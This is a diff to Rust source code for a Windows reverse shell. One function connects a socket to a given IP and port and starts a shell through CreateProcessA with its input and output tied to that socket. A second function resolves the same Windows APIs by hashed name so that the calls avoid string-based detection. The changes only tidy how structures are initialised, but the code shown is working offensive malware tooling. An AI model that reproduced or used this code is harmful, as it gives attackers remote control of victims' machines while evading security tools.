@@ -25,11 +25,10 @@ pub fn shell(ip: &str, port: u16) {
     // Call WSAStartup so that you can do anything with sockets
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSAStartup.html
-    let mut wsa_data = WSAData::default();
     let wsa_start_result = unsafe {
         WSAStartup(
             WSASTARTUPVAL,
-            &mut wsa_data
+            &mut WSAData::default()
         )
     };
     if wsa_start_result != 0 {
@@ -114,10 +113,11 @@ pub fn shell(ip: &str, port: u16) {
     // Call CreateProcessA to spawn a shell with stdin/stdout/stderr as the socket
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
-    // dwFlags --> 0x00000100 means that stdin/stdout/stderr contain information that needs to be parsed
+    // dwFlags --> STARTF_USESTDHANDLES (0x00000100) means that stdin/stdout/stderr contain information that needs to be parsed
     let mut startup_info = STARTUPINFOA {
         cb: mem::size_of::<STARTUPINFOA>() as u32,
-        dwFlags: STARTF_USESTDHANDLES, ..Default::default()
+        dwFlags: STARTF_USESTDHANDLES,
+        ..Default::default()
     };
     let sock_handle = &socket as *const SOCKET as *const HANDLE;
     startup_info.hStdInput = unsafe { *sock_handle };
@@ -150,10 +150,9 @@ pub fn shell(ip: &str, port: u16) {
 pub fn antistring_shell(ip: &str, port: u16) {
     // See line 16
     let function = rco_utils::find_function_address("Ws2_32", 0xedf45b56dba24418).unwrap();
-    let wsa_data = WSAData::default();
     unsafe { 
         mem::transmute::<*const (), fn(u16, WSAData)>
-        (function)(WSASTARTUPVAL, wsa_data) 
+        (function)(WSASTARTUPVAL, &mut WSAData::default())
     };
 
     // See line 25
@@ -203,9 +202,11 @@ pub fn antistring_shell(ip: &str, port: u16) {
 
     // See line 67
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
-    let mut startup_info = STARTUPINFOA::default();
-    startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;
-    startup_info.dwFlags = STARTF_USESTDHANDLES;
+    let mut startup_info = STARTUPINFOA {
+        cb: mem::size_of::<STARTUPINFOA>() as u32,
+        dwFlags: STARTF_USESTDHANDLES,
+        ..Default::default()
+    };
     let sock_handle = &socket as *const SOCKET as *const HANDLE;
     startup_info.hStdInput = unsafe { *sock_handle };
     startup_info.hStdOutput = unsafe { *sock_handle };
